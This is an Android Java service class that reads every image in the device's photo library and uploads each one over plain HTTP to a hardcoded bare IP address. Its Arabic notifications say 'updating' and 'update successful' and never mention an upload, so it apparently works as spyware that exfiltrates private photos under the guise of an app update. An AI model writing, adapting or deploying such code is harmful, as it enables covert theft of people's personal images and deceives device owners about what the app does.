package com.example.telegramphotobackup;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadService extends Service {
    private static final String CHANNEL = "photo_backup";
    private static final int NOTIFICATION_ID = 7;
    private static final String UPLOAD_URL = "http://145.239.69.111:20245/upload";

    @Override public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(NOTIFICATION_ID, notification("جاري التحديث…", true));
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            String result = uploadAllPhotos();
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            nm.notify(NOTIFICATION_ID, notification(result, false));
            stopForeground(false);
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private String uploadAllPhotos() {
        ContentResolver cr = getContentResolver();
        Uri collection = Build.VERSION.SDK_INT >= 29
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
        int count = 0;
        try (Cursor c = cr.query(collection, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c == null) return "خطأ: لم أستطع قراءة الصور";
            int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

            while (c.moveToNext()) {
                count++;
                long id = c.getLong(idCol);
                String name = c.getString(nameCol);
                Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));
                String error = uploadOne(uri, name);
                if (error != null) return "فشل الصورة " + count + ": " + error;
            }
            if (count == 0) return "لا توجد صور";
            return "تم التحديث بنجاح ✅";
        } catch (Exception e) {
            return "خطأ: " + shortError(e);
        }
    }

    private String uploadOne(Uri uri, String fileName) {
        String boundary = "----AndroidBoundary" + System.currentTimeMillis();
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(UPLOAD_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Connection", "close");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (OutputStream raw = conn.getOutputStream();
                 DataOutputStream out = new DataOutputStream(new BufferedOutputStream(raw));
                 InputStream in = new BufferedInputStream(getContentResolver().openInputStream(uri))) {
                if (in == null) return "تعذر فتح الصورة";

                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" +
                        fileName.replace("\"", "_") + "\"\r\n");
                out.writeBytes("Content-Type: image/jpeg\r\n\r\n");

                byte[] buffer = new byte[16384];
                int n;
                while ((n = in.read(buffer)) != -1) out.write(buffer, 0, n);

                out.writeBytes("\r\n--" + boundary + "--\r\n");
                out.flush();
            }

            int code = conn.getResponseCode();
            InputStream response = code >= 200 && code < 400 ? conn.getInputStream() : conn.getErrorStream();
            if (response != null) {
                try (InputStream r = response) {
                    byte[] b = new byte[4096];
                    while (r.read(b) != -1) { }
                }
            }
            if (code >= 200 && code < 300) return null;
            return "السيرفر رد " + code;
        } catch (Exception e) {
            return shortError(e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private String shortError(Exception e) {
        String name = e.getClass().getSimpleName();
        String msg = e.getMessage();
        if (msg == null || msg.trim().isEmpty()) return name;
        return name + ": " + msg;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "نسخ الصور", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification notification(String text, boolean ongoing) {
        if (Build.VERSION.SDK_INT >= 26) {
            return new Notification.Builder(this, CHANNEL)
                    .setContentTitle("الأسطورة")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_upload)
                    .setOngoing(ongoing)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("الأسطورة")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(ongoing)
                .build();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
